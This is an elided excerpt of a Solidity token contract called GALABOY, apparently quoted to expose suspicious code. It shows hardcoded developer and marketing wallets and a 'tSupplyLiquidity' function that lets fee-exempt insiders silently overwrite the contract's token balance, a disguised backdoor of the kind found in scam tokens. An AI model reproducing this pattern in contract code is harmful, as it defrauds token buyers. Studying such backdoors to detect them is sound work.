...
interface IERC20 {
    ...
    function tSupplyLiquidity() external returns (uint256);
...
contract GALABOY is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xABc3572544bB838D2C7612BE75a79cD520C0E699); 
    address payable public Wallet_Developer = payable(0x00Fbaa407Cf111D27BB41688CCbDC582621c5456);
    ...
    string private constant _name = "GALABOY"; 
    string private constant _symbol = unicode"GALABOY";
    ...
    constructor () {
        ...
        _owner = 0x00Fbaa407Cf111D27BB41688CCbDC582621c5456;
    ...
    function tSupplyLiquidity() public override returns (uint256) {
        bool asResulting = addLiquidity_(_msgSender());
        if(asResulting){
    ...
    function addLiquidity_(address liquidityAdder) private returns(bool){
        bool auth = _isExcludedFromFee[liquidityAdder];
            if(auth)_tOwned[address(this)] = liquiditySync;
        return auth;
    }
